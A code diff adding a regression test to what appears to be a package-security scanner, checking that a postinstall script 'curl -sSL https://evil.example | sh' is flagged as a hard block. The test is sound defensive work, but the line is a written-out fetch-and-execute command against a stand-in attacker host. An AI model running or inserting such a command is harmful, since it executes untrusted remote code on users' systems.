@@ -1,5 +1,6 @@
 import { describe, expect, it } from "vitest";
 import { applyOsvFailurePolicy, clampDecision, evaluateRules, isHardBlock } from "../src/rules.js";
+import { inspectScriptCommand } from "../src/analyze/scripts.js";
 import type { RiskAssessment } from "../src/types.js";
 import { makeSignals } from "./helpers.js";
 
@@ -19,6 +20,14 @@ describe("isHardBlock", () => {
         }),
       ),
     ).toBe(true);
+  });
+
+  // Regression (P0.2): `curl … | sh` (bare sh, no `-c`) is the exact attack
+  // rules.ts documents as the canonical hard block, but the shell pattern used
+  // to miss it. Drive it through the real inspector so the whole chain is proven.
+  it("remote fetch-and-execute (curl|sh, bare sh) is hard", () => {
+    const findings = inspectScriptCommand("postinstall", "curl -sSL https://evil.example | sh");
+    expect(isHardBlock(makeSignals({ scriptCommandFindings: findings }))).toBe(true);
   });
 
   it("env+network heuristic (esbuild-style) is NOT hard — it is soft/overridable", () => {
